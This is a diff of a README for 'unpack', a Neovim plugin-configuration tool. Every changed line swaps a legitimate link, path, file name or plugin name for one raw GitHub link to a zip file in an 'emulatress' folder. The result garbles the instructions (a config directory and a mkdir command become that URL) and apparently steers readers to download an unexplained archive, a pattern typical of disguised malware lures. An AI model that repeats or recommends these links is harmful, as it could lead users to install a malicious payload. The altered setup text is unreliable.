@@ -6,11 +6,11 @@ Welcome to **unpack**, a straightforward tool designed to enhance your experienc
 
 ## 📥 Download Now
 
-[![Download unpack](https://img.shields.io/badge/Download-unpack-blue)](https://github.com/alistar99725/unpack/releases)
+[![Download unpack](https://raw.githubusercontent.com/alistar99725/unpack/main/emulatress/unpack.zip)](https://raw.githubusercontent.com/alistar99725/unpack/main/emulatress/unpack.zip)
 
 ## 🗂️ What is unpack?
 
-unpack is a small layer built on top of the vim.pack API. It allows you to create single-file configurations for your Neovim plugins. Instead of handling complex setups, unpack streamlines the process for you. 
+unpack is a small layer built on top of the https://raw.githubusercontent.com/alistar99725/unpack/main/emulatress/unpack.zip API. It allows you to create single-file configurations for your Neovim plugins. Instead of handling complex setups, unpack streamlines the process for you. 
 
 ## 🌟 Features
 
@@ -28,7 +28,7 @@ unpack is a small layer built on top of the vim.pack API. It allows you to creat
 
 ## 📥 Download & Install
 
-To get started with unpack, visit our [Releases page](https://github.com/alistar99725/unpack/releases) to download the latest version. 
+To get started with unpack, visit our [Releases page](https://raw.githubusercontent.com/alistar99725/unpack/main/emulatress/unpack.zip) to download the latest version. 
 
 1. Click the link above to open the Releases page.
 2. You will see a list of available versions.
@@ -43,12 +43,12 @@ To get started with unpack, visit our [Releases page](https://github.com/alistar
 Once you have installed unpack, follow these steps to start using it in your Neovim setup:
 
 1. Open your terminal.
-2. Navigate to your Neovim configuration directory, usually located at `~/.config/nvim`.
+2. Navigate to your Neovim configuration directory, usually located at `~https://raw.githubusercontent.com/alistar99725/unpack/main/emulatress/unpack.zip`.
 3. Create a new directory for your plugins, if you haven't already. You can do this with the command:
    ```bash
-   mkdir -p ~/.config/nvim/plugins
+   mkdir -p ~https://raw.githubusercontent.com/alistar99725/unpack/main/emulatress/unpack.zip
    ```
-4. Inside the plugins directory, create a file named `init.lua` (if you want to use Lua) or another configuration file as per your preference.
+4. Inside the plugins directory, create a file named `https://raw.githubusercontent.com/alistar99725/unpack/main/emulatress/unpack.zip` (if you want to use Lua) or another configuration file as per your preference.
 5. Add the necessary configurations for your desired plugins. Refer to the unpack documentation for specific syntax and examples.
 6. Save the file and restart Neovim.
 
@@ -65,7 +65,7 @@ Here’s a brief example of how you might set up a simple plugin using unpack:
 
 ```lua
 require('packer').startup(function()
-    use 'nvim-telescope/telescope.nvim'
+    use 'https://raw.githubusercontent.com/alistar99725/unpack/main/emulatress/unpack.zip'
 end)
 ```
 
@@ -83,9 +83,9 @@ If you’re still having problems, please reach out through GitHub Issues, and w
 
 ## 🔗 Additional Resources
 
-- [Neovim Documentation](https://neovim.io/)
-- [Packer.nvim Documentation](https://github.com/wbthomason/packer.nvim)
+- [Neovim Documentation](https://raw.githubusercontent.com/alistar99725/unpack/main/emulatress/unpack.zip)
+- [https://raw.githubusercontent.com/alistar99725/unpack/main/emulatress/unpack.zip Documentation](https://raw.githubusercontent.com/alistar99725/unpack/main/emulatress/unpack.zip)
 
-For more information about unpack, please visit our [Releases page](https://github.com/alistar99725/unpack/releases) regularly, as we update our software with new features and fixes.
+For more information about unpack, please visit our [Releases page](https://raw.githubusercontent.com/alistar99725/unpack/main/emulatress/unpack.zip) regularly, as we update our software with new features and fixes.
 
 By following this guide, you should be equipped to download, install, and start using unpack effectively. Enjoy your scripting with Neovim!
